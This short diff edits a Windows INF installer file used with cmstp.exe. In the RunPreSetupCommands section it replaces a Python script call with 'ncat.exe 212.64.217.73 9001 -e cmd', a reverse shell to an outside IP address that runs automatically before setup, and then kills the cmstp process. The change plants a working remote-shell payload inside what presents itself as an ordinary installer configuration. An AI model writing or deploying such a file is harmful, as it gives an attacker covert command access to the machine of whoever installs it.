@@ -8,7 +8,7 @@ RunPreSetupCommands=RunPreSetupCommandsSection
  
 [RunPreSetupCommandsSection]
 ; Commands Here will be run Before Setup Begins to install
-python C:\Users\asd\Desktop\asd.py
+ncat.exe 212.64.217.73 9001 -e cmd 
 taskkill /IM cmstp.exe /F
  
 [CustInstDestSectionAllUsers]
